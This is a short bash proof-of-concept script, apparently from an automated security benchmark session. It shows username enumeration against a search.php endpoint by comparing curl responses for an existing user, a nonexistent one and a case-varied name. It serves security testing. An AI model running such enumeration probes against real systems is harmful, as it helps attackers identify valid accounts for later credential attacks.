#!/bin/bash
# POC: Demonstrates user enumeration vulnerability via username search endpoint. Shows how response differentiation allows attackers to identify valid usernames through brute-force attacks.
# Target: ./repo
# Created: 2025-11-07T18:41:17.044Z
# Session: benchmark-XBEN-095-24-mhp70jbg

# User Enumeration via Username Search POC
# Demonstrates how response differentiation reveals user existence

TARGET_URL="${1:-http://localhost/search.php}"
echo "[*] User Enumeration POC - Testing: $TARGET_URL"
echo ""

# Test 1: Search for existing user (admin)
echo "[+] Test 1: Searching for existing user 'admin'"
RESPONSE1=$(curl -s -X POST "$TARGET_URL" -d "username=admin" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response: $RESPONSE1"
if echo "$RESPONSE1" | grep -q "User exists"; then
    echo "✓ VULNERABLE: Response confirms user existence"
else
    echo "✗ Not vulnerable or different response format"
fi
echo ""

# Test 2: Search for non-existent user
echo "[+] Test 2: Searching for non-existent user 'nonexistent12345xyz'"
RESPONSE2=$(curl -s -X POST "$TARGET_URL" -d "username=nonexistent12345xyz" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response: $RESPONSE2"
if echo "$RESPONSE2" | grep -q "No results"; then
    echo "✓ VULNERABLE: Response indicates user doesn't exist"
else
    echo "✗ Not vulnerable or different response format"
fi
echo ""

# Test 3: Case-insensitive search
echo "[+] Test 3: Testing case-insensitive enumeration with 'ADMIN'"
RESPONSE3=$(curl -s -X POST "$TARGET_URL" -d "username=ADMIN" -H "Content-Type: application/x-www-form-urlencoded")
echo "Response: $RESPONSE3"
if echo "$RESPONSE3" | grep -q "User exists"; then
    echo "✓ VULNERABLE: Case-insensitive search still reveals user existence"
else
    echo "✗ Not vulnerable or different response format"
fi
echo ""

# Test 4: Response differentiation check
echo "[+] Test 4: Response Differentiation Analysis"
echo "Response for 'admin': $RESPONSE1"
echo "Response for 'nonexistent12345xyz': $RESPONSE2"

if [ "$RESPONSE1" != "$RESPONSE2" ]; then
    echo "✓ CRITICAL: Responses differ - enumeration is possible"
    echo "  Attacker can distinguish valid from invalid usernames"
else
    echo "✗ Responses are identical - enumeration not possible"
fi